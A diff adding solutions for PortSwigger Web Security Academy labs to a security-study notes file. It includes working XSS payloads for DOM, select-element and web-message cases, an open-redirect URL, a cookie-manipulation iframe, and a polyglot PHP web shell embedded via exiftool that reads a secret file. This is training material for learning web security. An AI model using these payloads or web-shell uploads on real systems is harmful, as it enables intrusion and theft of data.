@@ -301,6 +301,38 @@ Solution (encoded comment's request body):
 
 Payload: `';alert(1)//`
 
+### Lab: DOM XSS in document.write sink using source location.search inside a select element
+
+    https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element
+
+Notice the vulnerable code:
+
+```
+<script>
+                                var stores = ["London","Paris","Milan"];
+                                var store = (new URLSearchParams(window.location.search)).get('storeId');
+                                document.write('<select name="storeId">');
+                                if(store) {
+                                    document.write('<option selected>'+store+'</option>');
+                                }
+                                for(var i=0;i<stores.length;i++) {
+                                    if(stores[i] === store) {
+                                        continue;
+                                    }
+                                    document.write('<option>'+stores[i]+'</option>');
+                                }
+                                document.write('</select>');
+                            </script>
+```
+
+To exploit it one needs to provide a payload via `storeId` query parameter that breaks out from `<select>` element:
+
+    https://0a8b00b603bd07f280861258007f0017.web-security-academy.net/product?productId=1&storeId=<PAYLOAD>
+
+Payload:
+
+    a</option></select><script>alert(1)</script><select><option>b
+
 ## OAuth authentication
 
 ### Lab: Forced OAuth profile linking
@@ -1561,6 +1593,16 @@ Solution:
 
 <img width="1467" height="804" alt="image" src="https://github.com/user-attachments/assets/84019b52-8dfe-4522-9a4f-8c7c54c0e8b0" />
 
+### Lab: Remote code execution via polyglot web shell upload
+
+    https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
+
+Solution:
+
+1. Create simple `png` file
+2. add PHP code to it as a comment: `exiftool -comment='<?php system("cat /home/carlos/secret") ?>' trivial.png`
+3. Change file extension (png -> php) and upload it
+4. Execute uploaded file `https://0a11002603f526e2812e48ac002e00f0.web-security-academy.net/files/avatars/trivial.php`
 
 ## Business logic vulnerabilities
 
@@ -2128,3 +2170,41 @@ Message is parsed as JSON object (`d = JSON.parse(e.data);`) and then type prope
 Final payload that should be served from attacker controlled server will look like this:
 
     <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+
+### Lab: DOM XSS using web messages
+
+    https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages
+
+Deliver (via exploit server) following payload:
+
+    <iframe src=https://0a1600690327559e80a303d400c500dd.web-security-academy.net/ onload='this.contentWindow.postMessage("<img src/onerror=print()>","*")'>
+
+
+### Lab: DOM XSS using web messages and a JavaScript URL
+
+    https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url
+
+Deliver (via exploit server) following payload:
+
+    <iframe src=https://0af2008c037e84348525034d00b10065.web-security-academy.net/ onload='this.contentWindow.postMessage("javascript:print(\"http:\")","*")'>
+
+### Lab: DOM-based open redirection
+
+    https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection
+
+Vulnerable code:
+
+    <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
+
+Solution (if `url` parameter is present use it as a `Back to Blog` link:
+
+    https://0ad500c6043fb5b3801d0307002c00fd.web-security-academy.net/post?postId=4&url=https://exploit-0a97003004cdb5e3803502cf01a8004b.exploit-server.net
+
+
+### Lab: DOM-based cookie manipulation
+
+    https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation
+
+Deliver (via exploit server) following payload:
+
+    <iframe src="https://0a0900ec040f2cb58005120e00bb003f.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a0900ec040f2cb58005120e00bb003f.web-security-academy.net';window.x=1;">
